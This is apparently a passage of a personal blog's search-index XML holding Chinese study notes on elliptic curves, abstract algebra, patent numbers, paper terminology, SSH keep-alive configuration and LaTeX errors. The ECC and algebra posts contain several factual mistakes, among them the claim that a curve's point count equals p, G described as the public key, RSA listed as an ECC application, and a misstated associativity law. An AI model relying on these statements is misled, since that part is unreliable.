type="1"><li><ahref="https://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E7%BE%A4/2876454#:~:text=%E5%BE%AA%E7%8E%AF%E7%BE%A4%E6%98%AF%E4%B8%80%E7%A7%8D,%E5%BE%AA%E7%8E%AF%E7%BE%A4%E4%B8%A4%E7%A7%8D%E7%B1%BB%E5%9E%8B%E3%80%82">循环群_百度百科</a></li><li><ahref="https://chenliang.org/2021/02/26/group-theory/">密码学-02-群论基础· 陈亮的个人博客</a></li><li><a href="https://en.wikipedia.org/wiki/Category_theory">Categorytheory - Wikipedia</a></li><li><ahref="https://www.bananaspace.org/wiki/%E6%9C%89%E9%99%90%E5%9F%9F">有限域- 香蕉空间</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5. ECC 椭圆曲线</title>
      <link href="/blog/2023/03/10/crypto/math/5.ecc/"/>
      <url>/blog/2023/03/10/crypto/math/5.ecc/</url>
      
        <content type="html"><![CDATA[<h1 id="ecc-椭圆曲线">5. ECC 椭圆曲线</h1><h2 id="简介">简介</h2><p>椭圆曲线属于代数几何范畴（algebraicgeometry），目前被数论和群论广泛研究，并应用于密码学中。该曲线是一个包含如下形式点的平面代数曲线：<span class="math inline">\(y^2=x^3+ax+b\)</span>，其中 a 和 b是常数。不同的参数 a 和 b 会导致不同形状的椭圆曲线。</p><p>椭圆曲线的一个重要性质是它们的点可以进行"加法"运算。通过对两个点进行特殊的加法运算，可以得到一条仍位于该曲线上的新点。这种加法运算的定义是特定的，并且有一些规则。</p><p>椭圆曲线在密码学中的应用很多，其中最著名的是用于公钥密码学中的椭圆曲线加密（ECC）。在ECC 中，椭圆曲线的某个点 G 被用作公开的公钥，而 "加法"运算过程用于生成互相共享交换的 key，从而实现加密和解密。由于 ECC需要比其他加密算法使用更短的密钥长度，因此它通常被认为是一种更加安全和高效的加密方法。</p><h2 id="运算">运算</h2><p>定义椭圆曲线上的加法运算：将两个点相加得到第三个点的操作。计算A+B，过 A，B 两点做一条直线穿过椭圆曲线，然后做关于 x 轴的轴对称：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16785841055049.jpg"alt="ECC operation" /><figcaption aria-hidden="true">ECC operation</figcaption></figure><p>直观感受：观察上图,可以发现虽然点位于曲线上，但相对于整个平面而言，1P2P 3P 等的位置非常混乱没有规律, 这就是困难问题所在，导致其私钥 k 极其难求。</p><h2 id="离散化---有限域">离散化 -&gt; 有限域</h2><p>椭圆曲线是连续的，定义在实数域上，并不适合加密。将椭圆曲线变成离散的点，把椭圆曲线映射到一个有限域上，这个过程称：椭圆曲线的离散化或者在有限域上的定义。</p><p>为什么要离散化？</p><blockquote><p>为什么连续函数不适合加密，因为实数是连续的，知道结果可以用逆运算求解，函数值随着自变量的变化而连续变化，这意味着在输入值的微小变化下，函数值也会随之微笑地变化，这种连续性使得函数的变化可以攻击者通过输入输出对（明文-密文对）的分析所探测到，这种攻击技术成为“差分分析”。相比之下，离散函数在输入值发生微小变化时，输出值也会发生较大的变化，这使得差分攻击更加困难，因此离散函数更适合加密算法，常见离散函数加密算法包括RSA，椭圆曲线密码学等。 计算机对浮点数的处理会损失精度,产生某些位的 浮点位错误，对计算连续函数不友好。举例<code>1.2-1.0=0.19999999999999996​​</code>，<code>7/3=2.3333333333333335</code></p></blockquote><p>将其映射到有限域上，方便进行离散化的操作，在有限域上就不存在丢失精度问题了。</p><h2 id="有限域上的椭圆曲线">有限域上的椭圆曲线</h2><ol type="1"><li>有限域上的椭圆曲线上的点数量是有限的。其数量等于有限域的大小p。该数量包括一个特殊的“无穷远点” （Infinity Point）。</li><li>在有限域上，由于点的数量是有限的，所以我们定义椭圆曲线上的倍乘运算，即将一个点诚意一个整数k，得到另一个点。这个运算可以通过重复进行加法来实现，即将一个点不断地加上自己，直到加了k 次即得 kG。</li><li>符合交换律，结合律，分配律</li></ol><p>P+Q 运算：</p><p><span class="math inline">\(x_3 \equiv k^2 - x_1 - x_2 \modp\)</span></p><p><span class="math inline">\(y_3 \equiv k(x_1-x_3)-y_2 \modp\)</span></p><p>若 <span class="math inline">\(P = Q\)</span>，则 <spanclass="math inline">\(k = (3x_1^2+a)/2y_1 \mod p\)</span> 若 <spanclass="math inline">\(P \ne Q\)</span>, 则 <span class="math inline">\(k= y_2-y_1/(x_2-x_1) \mod p\)</span></p><p>标量乘法 kP, 先做倍数，再做加法（该方法称为：double and add）：</p><p><span class="math display">\[\begin{aligned}151 &amp; =10010111 \\&amp; =1 \cdot 2^7+0 \cdot 2^6+0 \cdot 2^5+1 \cdot 2^4+0 \cdot 2^3+1\cdot 2^2+1 \cdot 2^1+1 \cdot 2^0 \\&amp; =2^7+2^4+2^2+2^1+2^0+ \\\text { 即 } 151 P &amp; =2^7 P+2^4 P+2^2 P+2^1 P+2^0 P\end{aligned}\]</span></p><h2 id="ecdlp-椭圆曲线的离散对数困难问题">ECDLP椭圆曲线的离散对数困难问题</h2><p>首先, 任何加密算法可以实现加密的原因都是因为存在一个难解的困难问题,这个问题的困难程度决定了这个算法的加密强度。</p><p>对于 ECC 椭圆曲线上的两个点 P 和 Q， 任意整数 k: Q = kP</p><p>为什么是困难问题：</p><ol type="1"><li><p>给定 k 与 P，根据加法法则，计算 Q 很容易（对应验证过程）</p><p>计算过程大致为：将 k 分解为二进制，对应为 2^iP的加和形式，然后只需要计算极少部分，就可以得到 kP。例如上述例子151P，只需要计算 P+P，2P+2P，4P+4P，4P+2P, P 并加起来，大概 8次运算，基本上是枚举次数的 O(logn)。</p></li><li><p>给定 Q 与 P，求 k 非常困难（在 ECC 的实际应用中，质数 k取的非常大，想穷举出 k 非常困难） 对于攻击者而言，它不知道 k值，因此需要逐个枚举，151P 则需要计算 150次。当我们使用椭圆曲线时，选取的 k 非常大。例如假设宇宙中的原子数目为10^82（大约 2^275），正向计算 Q=kP 的运算量仅仅为 275 个 double-and-add步骤，而攻击者想要推测 k， 则需要 10^82-1 次计算。</p></li></ol><p>所以 Q = kP(k 为大数)，已知 k，P 计算 Q对我们来说很容易，对攻击者来说，已知 Q P，计算 k 则是困难的。</p><h2 id="应用">应用</h2><p>DH 密钥交换，RSA 算法</p><h2 id="推荐与参考">推荐与参考</h2><ol type="1"><li><ahref="https://blog.cloudflare.com/a-relatively-easy-to-understand-primer-on-elliptic-curve-cryptography/">A(Relatively Easy To Understand) Primer on Elliptic CurveCryptography</a></li><li><ahref="https://fangpenlin.com/posts/2019/10/07/elliptic-curve-cryptography-explained/">EllipticCurve Cryptography Explained – Fang-Pen's coding note</a></li><li><a href="https://curves.xargs.org/">The Animated EllipticCurve</a></li><li><ahref="https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/">EllipticCurve Cryptography: a gentle introduction - Andrea Corbellini</a></li><li><a href="https://www.johannes-bauer.com/compsci/ecc/">Elliptic CurveCryptography Tutorial</a></li><li><ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/29">【ECC】初识椭圆曲线_Demian101on github</a></li><li><ahref="https://github.com/huyuguang/zkpblog/blob/master/%E6%9C%89%E9%99%90%E5%9F%9F.md">zkpblog/有限域.mdat master · huyuguang/zkpblog · GitHub</a></li><li><ahref="https://github.com/AlexiaChen/AlexiaChen.github.io/issues/15#tocbar-iou9gg">从群环域到椭圆曲线密码学· Issue #15 · AlexiaChen/AlexiaChen.github.io</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0. 宏观角度切入抽象代数之群环域</title>
      <link href="/blog/2023/03/03/crypto/math/0.abstract_alg_intro/"/>
      <url>/blog/2023/03/03/crypto/math/0.abstract_alg_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="宏观角度切入抽象代数之群环域">0.宏观角度切入抽象代数之群环域</h1><h2 id="集合论现代数学的根基">集合论：现代数学的根基</h2><p>现代数学的基础是集合论，集合论中最基本的概念：集合（set），关系（relation），函数（function）,等价（equivalence）在其他数学分支的语言中几乎必然存在的。TheBourbaki school 将 mathematical structures 分为三类：Orderstructures，Algebraic structures，Topological structures，他们都是基于set theory 的，更高阶的数学结构基本上可以归为这三种基本类型的组合。</p><p>下图是另一种更为详尽的分类：<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16781664605753.jpg"alt="数学分类" /></p><p>在集合论的基础上，现代数学有两大家族：分析(Analysis)和代数(Algebra)。至于其它的，比如几何和概率论，在古典数学时代，它们是和代数并列的，但是它们的现代版本则基本是建立在分析或者代数的基础上，因此从现代意义说，它们和分析与代数并不是平行的关系。</p><p>分析学：主要涉及微积分，实分析，拓扑学，微分几何代数学：主要涉及线性代数，李代数</p><p>本文以下从三种结构分类切入抽象代数</p><ul><li><p>Order structures: 数的相对多少，大小，例如：自然数</p></li><li><p>Algebraic structures an algebraic structure consists of anonempty set A, a collection of operations on A (typically binaryoperations such as addition and multiplication), and a finite set ofidentities, known as axioms, that these operations must satisfy.代数结构：set of specific objects + correspondingoperations(类似计算机的数据结构：数据+操作)代数主要研究的是运算规则。一门代数，其实都是从某种具体的运算体系中抽象出一些基本规则，建立一个公理体系，然后在这基础上进行研究。</p><ol type="1"><li>elementary algebra elementary algebra只考虑实数和复数代数结构，不考虑其之外的代数领域。</li><li>abstract algebra<br />group，ring，field</li></ol></li><li><p>Topological structures:</p><p>topology concerns with the properties of a geometric object that arepreserved under continuous deformations, such as stretching, twisting,crumpling, and bending;</p></li></ul><h2 id="abstract-algebra">Abstract Algebra</h2><p>抽象代数(abstract algebra)、近世代数、现代代数(modernalgebra)指的都是同一个意思(甚至直接称为代数学)。<strong>抽象代数主要研究对象是代数结构，包括群、环、域、向量空间。</strong></p><p>伽罗瓦(Évariste Galois,1811-1832)是现代群论的创始人(与阿贝尔独立发明)，他利用群的概念彻底解决了用根式求解代数方程的可能性问题(称为伽罗瓦理论)，系统阐释了为何五次以上之方程式没有公式解，而四次以下有公式解，使<strong>代数学从解方程的科学转变为研究代数结构的科学，即把代数推广到抽象代数</strong>。</p><p>抽象代数有在一些基础定理的基础上，进一步的研究往往分为两个流派：<strong>研究有限的离散代数结构（比如有限群和有限域）</strong>，这部分内容通常用于数论，编码和整数方程这些地方；另外一个流派是<strong>研究连续的代数结构</strong>，通常和拓扑与分析联系在一起（比如拓扑群，李群），我的研究主要涉及有限的离散代数结构，群环域等。</p><h3 id="线性代数">线性代数</h3><p>现代代数的入门点则是两个部分：线性代数(linearalgebra)和基础的抽象代数(abstractalgebra)。线性代数是抽象代数特殊的一类，其代数结构为：向量空间(vectorspaces，也叫线性空间) + 线性变换(linear mappings)。</p><p>对于做 learning，statistic的，接触最多的就是线性代数。线性代数，包括建立在它基础上的各种学科，最核心的两个概念是<strong>向量空间和线性变换</strong>。<strong>线性变换在线性代数</strong>中的地位和<strong>连续函数在分析</strong>中的地位，或者<strong>同态映射在群论中的地位</strong>是一样的—— <strong>它是保持基础运算（加法和数乘）的映射。</strong></p><p>在 learning中有这样的一种倾向——鄙视线性算法，标榜非线性。也许在很多场合下面，我们需要非线性来描述复杂的现实世界，但是无论什么时候，线性都是具有根本地位的。没有线性的基础，就不可能存在所谓的非线性推广。我们常用的非线性化的方法包括流形和kernelization，这两者都需要在某个阶段回归线性。</p><h3 id="初等代数抽象代数">初等代数–&gt;抽象代数</h3><p>抽象代数将初等代数的一些概念延伸。</p><ol type="1"><li>数 -&gt; 集合</li></ol><p>集合在朴素集合论(naive set theory)和公理化集合论(axiomatic settheory)的定义是不一样的，前者指由一些元素组成；后者指具有某种特定性质事物的总体。</p><p>抽象代数考虑的集合是 a collection of all objects + specificproperty</p><blockquote><p>Rather than just considering the different types of numbers, abstractalgebra deals with the more general concept of sets: a collection of allobjects (called elements) selected by property specific for the set.</p></blockquote><p>(2)+ -&gt; 二元运算</p><p>加号 + 被抽象为二元运算(binaryoperation)，对两个元素作二元运算，得到的新元素仍然属于该集合，这叫封闭性(closure)。实际上，加减乘除都叫二元运算 (二元指的是两个操作数)</p><p>(3)0/1 –&gt; 单位元</p><p>0 和 1 被抽象成单位元(identity elements)，0 为加法单位元，1为乘法单位元。单位元是集合的一个特殊元素(跟二元运算有关)，满足单位元与其他元素相结合时，不改变该元素，即满足a<em>e = a 与 e</em>a =a。可见，单位元取决于元素与二元运算，如矩阵的加法单位元是零矩阵，矩阵的乘法单位元是单位矩阵。值得注意的是，有些集合不存在单位元</p><ol start="4" type="1"><li>负数 –&gt; 逆元素</li></ol><p>负数推广到逆元素(inverse element)，对于加法，a的逆元素是-a；对于乘法，a 的逆元素是倒数a−1。直观地说，逆元可以撤销操作，如加了一个数a，再加上该数的逆元-a(相当于撤消操作)，结果还是一样。</p><p>(5)结合律</p><p>结合律(Associativeproperty)是某些二元运算的性质，<code>a*(b*c) = a*(b*c)</code>，有些二元运算没有结合律(如减法、除法、</p><p>(6)交换律</p><p>交换律(Commutativeproperty)，改变二元运算符两边的元素不影响结果。并不是所有二次元运算都满足交换律(如矩阵的乘法)</p><h3 id="群环域">群,环,域</h3><p>首先放一张总结图以供快速查阅：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16781715243330.jpg"alt="群，环，域" /><figcaption aria-hidden="true">群，环，域</figcaption></figure><h4 id="群论">群论</h4><ol type="1"><li><p>原群(magma)是一种基本的代数结构，只要满足两元素作二元运算得到新元素仍属于该集合M，即封闭性: <code>MxM-&gt;M</code>。</p></li><li><p>半群 (Semigroup) 满足结合律(associativeproperty)的代数结构。V=&lt;S，_ &gt;，其中二元运算 <code>_</code>是可结合的，即<code>(a*b)*c=a*(b*c)</code>，则称 V 是半群。</p></li><li><p>幺半群 (monoid) 在半群的基础上，还需要满足有一个单位元。</p></li><li><p>群群(group)是两个元素作二元运算得到的一个新元素，需要满足群公理(groupaxioms)，即：</p><p>封闭性：<code>a * b</code> is another element in the set结合律：<code>(a * b) * c = a * (b * c)</code>单位元：<code>a * e = a and e * a = a</code> 逆 元：加法的逆元为<code>-a</code>，乘法的逆元为倒数 <code>1/a</code> 或写作<code>a^(-1)</code> (对于所有元素)</p><p>整数加法 (Z,+)就是一个群</p></li><li><p>阿贝尔群(交换群) 阿贝尔群(AbelianGroup)在群的基础上，还需满足交换律。如整数集合和加法运算，(Z,+)，是一个阿贝尔群。</p><p>交换律：<code>a + b = b + a</code></p></li></ol><p>一个群的阶是指其元素的个数； 一个群内的一个元素 a之阶（有时称为周期）是指会使得 <span class="math inline">\(am =e\)</span> 的最小正整数 m（其中的 e 为这个群的单位元素，且 am 为 a 的 m次幂）。 若没有此数存在，则称 a 有无限阶。有限群的所有元素都有有限阶。</p><h4 id="环论">环论</h4><p>环在交换群基础上，进一步限制条件，区别于群论，环是针对一个集合的两种运算的。</p><p>环(ring)在阿贝尔群(也叫交换群)的基础上，添加一种二元运算(虽叫乘法，但不同于初等代数的乘法)。一个代数结构是环(R,+, ·)，需要满足环公理：</p><ol type="1"><li>(R, +)是交换群</li></ol><p>封闭性：<code>a + b</code> is another element in the set结合律：<code>(a + b) + c = a + (b + c)</code> 单位元：加法的单位元为0，<code>a + 0 = a and 0 + a = a</code> 逆 元：加法的逆元为-a，<code>a + (−a) = (−a) + a = 0</code> (对于所有元素)交换律：<code>a + b = b + a</code></p><ol start="2" type="1"><li>(R, ·)是幺半群</li></ol><p>封闭性：<code>a ⋅ b</code> is another element in the set 结合律：(a ⋅b) ⋅ c = a ⋅ (b ⋅ c) 单位元：乘法的单位元为 1，a ⋅ 1 = a and 1 ⋅ a =a</p><p>(3)乘法对加法满足分配律 Multiplication distributes over addition</p><p><code>a ⋅ (b + c) = (a ⋅ b) + (a ⋅ c)</code> for all a, b, c in R(left distributivity) <code>(b + c) ⋅ a = (b ⋅ a) + (c ⋅ a)</code> forall a, b, c in R (right distributivity)</p><p>交换环: 交换环(commutativering)在环的基础上，二元运算乘法还满足交换律。</p><h4 id="域">域</h4><p>域是一种可以进行加减乘除(除 0以外)的代数结构，是数域与四则运算的推广。</p><p>域是  由同一集合的两个运算的交换群组成</p><h4 id="总结">总结</h4><p>群：一个运算符；环域：两个运算符</p><p>在主要的代数结构中，最简单的是群(Group)——它只有一种符合结合率的可逆运算，通常叫“乘法”。如果，这种运算也符合交换率，那么就叫阿贝尔群(AbelianGroup)。如果有两种运算，一种叫加法，满足交换率和结合率，一种叫乘法，满足结合率，它们之间满足分配率，这种丰富一点的结构叫做环(Ring)，如果环上的乘法满足交换率，就叫可交换环(CommutativeRing)。如果，一个环的加法和乘法具有了所有的良好性质，那么就成为一个域(Field)。基于域，我们可以建立一种新的结构，能进行加法和数乘，就构成了线性代数(Linearalgebra)。</p><h2 id="参考文章">参考文章</h2><ol type="1"><li><ahref="https://en.wikipedia.org/wiki/Algebraic_structure">Algebraicstructure - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Topology">Topology -Wikipedia</a></li><li><ahref="http://sparkandshine.net/en/mit-mathematical-formalism/#42">[转]MIT牛人解说数学体系 – Spark &amp; Shine</a></li><li><ahref="http://sparkandshine.net/en/algebraic-structure-primer-group-ring-field-vector-space/#21">代数结构入门：群、环、域、向量空间– Spark &amp; Shine</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>专利小知识</title>
      <link href="/blog/2023/02/16/academic/patent_knowledge/"/>
      <url>/blog/2023/02/16/academic/patent_knowledge/</url>
      
        <content type="html"><![CDATA[<p>专利一共有四类号或者说三类：申请号（专利号）、公布号、公告号：</p><ul><li>申请号：申请号和申请日相关，只要申请即产生。</li><li>公布号：公布号只有发明专利才有。发明专利审查为实质审查，先公布，公布之后即有公布号，就相当于该专利申请已经被公开了，任何人都可以看到。</li><li>公告号：；发明专利公布后，再由实审审查员进行授权或者驳回，授权后即产生公告号。实用新型专利和外观设计专利都是初步审查，审查过程是保密的，不会像发明专利一样有公开号，审查员做出授权或者驳回结论，授权后即产生公告号。公告号只有授权的专利才有。</li></ul><p>专利号：专利授权以后，申请号前面加上 ZL 即为专利号。</p><p>一般关注专利的授权时间</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文中常用词与易混词</title>
      <link href="/blog/2023/02/16/academic/thesis_words/"/>
      <url>/blog/2023/02/16/academic/thesis_words/</url>
      
        <content type="html"><![CDATA[<h2 id="理论推导名词-assumptionlemma-theorem-proof-remark">理论推导名词assumption、lemma, theorem, proof, remark</h2><p>assumption 是假设，写在 lemma 前，后面得到的 theorem 一般需要前面的assumption。</p><p>Lemma 是引理，一般是前人已经证明出的结论，你在论文中 Proof时需要用到，所以要写在 Proof 前面。</p><p>theorem是定理，是自己论文中推导出的理论，也是论文中的主要贡献说明，一般写在lemma 之后，proof 之前，proof 就是要证明你的 theorem。</p><p>remark 是备注、标注，写在 proof 之后，就是证明完自己论文中的 theorem之后，对 theorem 进行说明，因为得到的 theorem可能只适用于一种系统模型，如果换一种系统模型，也可以用论文中的 theorem解决的话，就要在 remark 中说明，作用就是不使得 theorem 太局限。另一种remark，是解释自己的 theorem 和别人的不同点，一般是自己的 theorem和别人的相似，避免被审稿人 pass 掉，然后 remark 说明一下。remark还可以说明一下 theorem的优点，是受到哪篇文章的启发，和受启发文章相比的优点。</p><p>一般顺序是assumption、lemma、theorem、proof、remark。但一篇论文中不一定全包含这五部分，例如有的proof 很简单就不需要前面加 lemma 了。</p><h2 id="convergence-rate">convergence rate</h2><p>In numerical analysis, rate of convergence is a measure of howquickly a sequence approaches its limit. It is used to describe how fastan iterative algorithm converges to a solution. The rate of convergenceis also called the asymptotic error constant1.</p><p>For example, if we have an iterative algorithm that produces asequence of approximations to a solution, then the rate of convergencetells us how quickly these approximations converge to the truesolution</p><h2 id="et-al.-and-i.e.">et al. and i.e.</h2><p>There is no period after the<code>et'' in the Latin abbreviation</code>et al.''. The abbreviation<code>i.e.'' means</code>that is'', and the abbreviation<code>e.g.'' means</code>for example''.</p><h2 id="区间符号">区间符号</h2><p>符号 "∀i∈[d]" 表示 "对于所有的 i 属于 [d]"，其中 [d]表示一个数字区间，包含从 1 到 d的所有正整数。这个符号通常用在数学或计算机科学中，表示一个量或者变量需要满足一定条件或者取遍某个范围内的所有可能取值。</p><p>例如，如果有一个向量 x 包含 d 个实数，那么可以写成：</p><p>∀i∈[d], x[i] ∈ R</p><p>这个式子的意思是，对于 x 中的每一个下标 i，x[i] 都是实数集合 R中的一个元素。也就是说，向量 x 中的所有元素都是实数。</p><h2 id="s.t.">s.t.</h2><p>在优化问题的求解中，如线性规划、非线性规划问题等，经常会遇到数学符号“s.t.”，它的意思是什么呢？</p><p>“s.t.”，指 subject to，受限制于...。</p><p>例如： 目标函数：min {x+2} 约束条件：s.t. x={1,2,3}</p><p>其题意为，求 x+2 的最小值以使得 x 的取值为 1、2、3 时。 或者理解为，x的取值为 1、2、3 时，求 x+2 的最小值。</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Keep SSH alive when no operation for a period of time</title>
      <link href="/blog/2023/02/16/linux/git/keep_ssh_alive/"/>
      <url>/blog/2023/02/16/linux/git/keep_ssh_alive/</url>
      
        <content type="html"><![CDATA[<h2 id="ssh-远程长时间不操作就断开">ssh 远程长时间不操作就断开</h2><p>最近在远程使用 jupyter notebook, 但是 vscode remote时间一长就会断开,导致 notebook的输出排版乱或者甚至连接断开,因此找到如下两种方法,一起使用后几乎没有断开过了.</p><h2 id="主机定时连服务器">主机定时连服务器</h2><p>在主机的 ssh 配置中,设置如下来保持连接:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host SomeRemoteHost</span><br><span class="line">  HostName MyRemoteHostName</span><br><span class="line">  User MyUsername</span><br><span class="line">  ServerAliveInterval 60</span><br><span class="line">  ServerAliveCountMax 30</span><br></pre></td></tr></table></figure><p>注意:如果你的主机进入休眠模式,则不起效果.但是当你干别的事情时,它可以在后台保持连接</p><h2 id="让服务器定时回连主机">让服务器定时回连主机</h2><p>编辑 <code>sshd_config</code>  配置文件<code>sudo vim /etc/ssh/sshd_config</code></p><p>在其中找到以下配置项目:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br></pre></td></tr></table></figure><p>去除注释并修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClientAliveInterval 60</span><br><span class="line">ClientAliveCountMax 3</span><br></pre></td></tr></table></figure><p><code>ClientAliveInterval</code> 指定了服务器端向客户端请求消息的时间间隔, 默认是  <code>0</code> ,不发送. 而  <code>ClientAliveInterval 60</code>  表示每分钟发送一次,然后客户端响应, 这样就保持长连接了.</p><p><code>ClientAliveCountMax</code> , 使用默认值  <code>3</code> 即可. <code>ClientAliveCountMax</code> 表示服务器发出请求后客户端没有响应的次数达到一定值, 就自动断开.正常情况下, 客户端不会不响应.</p><p>macOS 重启  <code>sshd service</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist</span><br><span class="line">sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl stop com.openssh.sshd</span><br><span class="line">sudo launchctl start com.openssh.sshd</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><ol type="1"><li><p><ahref="https://tszv.vercel.app/pages/94a7fe/#%E9%85%8D%E7%BD%AE%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5">Mac使用 VS Code 配合 Remote Development 插件连接 Windows 远程服务器 |Henry</a></p></li><li><p><ahref="https://stackoverflow.com/questions/60714159/is-there-a-way-to-reconnect-to-a-disconnected-vs-code-remote-ssh-connection">Isthere a way to reconnect to a disconnected VS Code Remote SSHconnection? - Stack Overflow</a></p></li><li><p><ahref="https://stackoverflow.com/questions/45107901/running-jupyter-notebook-in-the-background-on-remote-server-get-output">ssh- Running Jupyter Notebook in the background on remote server, getoutput - Stack Overflow</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX 报错问题汇总</title>
      <link href="/blog/2023/02/16/misc/latex/latex_errs/"/>
      <url>/blog/2023/02/16/misc/latex/latex_errs/</url>
      
        <content type="html"><![CDATA[<h1 id="vscode-latex-编译报错问题汇总">VSCode Latex编译报错问题汇总</h1><ol type="1"><li><p>使用 pdflatex 四步编译，下载的 IEEE期刊模版，报错：<code>I found no \bibdata command</code></p><p>原因是该 receipe 使用了 bibtex 可执行文件，会需要 bib引用作为输入，因此解决方法就是在.tex 文件的\end{document}前面加两句</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\bibliographystyle&#123;IEEEtran&#125;</span><br><span class="line">\bibliography&#123;refs.bib&#125;</span><br></pre></td></tr></table></figure></p><p>然后创建 refs.bib, 看可否，不行的话，引用一个文献，就可以了</p></li><li><p>pdflatex 和 xelatex 区别</p><p>区别比较多，基本语言区别不大。比如字体方面，XeLaTeX是可以直接调用操作系统字体的，多语言的场景，xelatex使用比较方便，PDFLaTeX 是不行的。英文场景 pdflatex 足够用了。</p></li><li><p>vscode latex 中 sort bib的功能,按照作者年份等排序,并可配置是否去重等,但是一般用不到.</p></li><li><p>latex 编译报错</p><ol type="1"><li>杀掉 vscode 进程，重启 vscode</li><li>删除辅助文件，重新编译</li><li>检查 begin end {} 配对数目</li><li>检查公式的 <code>_</code> 是否转义</li><li>换 overleaf 编译一下试试</li></ol></li></ol><h2 id="latex-报错容易找不到的地方">LaTeX 报错容易找不到的地方</h2><ol type="1"><li>作者邮箱中含有 <code>_</code> 等需要反斜杠转义的符号</li><li>作者的 bio 中含有 <code>&amp;</code> 等需要反斜杠转义的符号</li></ol><h1 id="latex-no-endif-endfor">Latex no endif endfor</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\usepackage[noend]&#123;algorithmic&#125;</span><br></pre></td></tr></table></figure><p>伪代码 <code>_</code> 要写成<code>\_</code> 转义</p><h2 id="underfull-hbox-badness-10000-in-paragraph-at-lines">Underfullhbox (badness 10000) in paragraph at lines</h2><p>Underfull 是说该处排版内容太稀疏了（badness 10000) 是 TeX衡量排版效果不好的一个尺度；可以通过使用空格符和换行符来进行处理。</p><p>Overfull 是说该处内容太多，超出了设定的印刷范围 49.88315点。这多数是由于系统无法找到合适的自动换行点造成的。</p><p>不过这两个警告都不影响实际显示，若嫌麻烦，不处理也没事。造成underfull 的原因有很多，最常见是在不该使用 <code>\\</code> 的地方使用了<code>\\</code>.</p><h2 id="supplementary">supplementary</h2><p>supplementary使用的包建议直接从主文件<strong>完全</strong>复制过来，然后加上以下两行：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;xr&#125;</span><br><span class="line"><span class="keyword">\externaldocument</span>&#123;主文件名字&#125;</span><br><span class="line"><span class="keyword">\setcounter</span>&#123;equation&#125;&#123;设置 supplementary 的公式起始符号&#125;</span><br></pre></td></tr></table></figure><p>如果主文件使用了 hyperref 包来点击跳转和加 bookmark，那 supplementary还需要加上以下两行：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>[breaklinks,colorlinks,linkcolor=black,citecolor=black,urlcolor=black]&#123;hyperref&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;xr-hyper&#125;</span><br></pre></td></tr></table></figure><p>最近使用的时候就因为主文件使用了 hyperref，然后 supplementary没有加上这两行，导致引用主文件公式的时候名称多一些 section名字，通过查看 aux辅助文件，我料想应该是这个包的问题，尝试之后确实纠正了。</p><h2 id="supplementary-使用-appendices-大片空白">supplementary 使用appendices 大片空白</h2><p>当要把正文中的证明等换到 supplementary中时，由于当时将正文的公式都使用了下面的命令进行空间压缩，因此 latex的自动调整不合适了。因此去掉这些固定距离的代码，latex自动调整就没有大片空白了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\setlength&#123;\abovedisplayskip&#125;&#123;1pt&#125;</span><br><span class="line">\setlength&#123;\belowdisplayskip&#125;&#123;1pt&#125;</span><br></pre></td></tr></table></figure><h2id="或-newline-前方需要有问题否则报错-latex-error-theres-no-line-here-to-end."><code>\\</code>或 <code>\newline</code> 前方需要有问题，否则报错 LaTeX Error: There'sno line here to end.</h2><h2 